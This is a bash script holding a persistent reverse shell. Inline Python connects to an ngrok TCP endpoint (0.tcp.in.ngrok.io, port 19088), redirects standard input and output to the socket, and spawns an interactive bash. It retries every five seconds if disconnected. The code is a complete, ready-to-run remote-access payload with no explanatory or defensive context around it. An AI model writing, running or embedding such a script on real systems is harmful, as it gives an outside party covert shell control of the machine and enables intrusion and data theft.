#!/bin/bash

export RHOST="0.tcp.in.ngrok.io"
export RPORT=19088

while true; do
    python3 -c '
import sys, socket, os, pty, select
s = socket.socket()
try:
    s.connect((os.getenv("RHOST"), int(os.getenv("RPORT"))))
except Exception:
    sys.exit(1)

# Attach stdin/stdout/stderr
for fd in (0,1,2):
    os.dup2(s.fileno(), fd)

# Monitor connection and exit if it closes
try:
    pty.spawn("bash")
except OSError:
    pass
finally:
    s.close()
    sys.exit(0)
'
    echo "[*] Disconnected, retrying in 5 seconds..."
    sleep 5
done
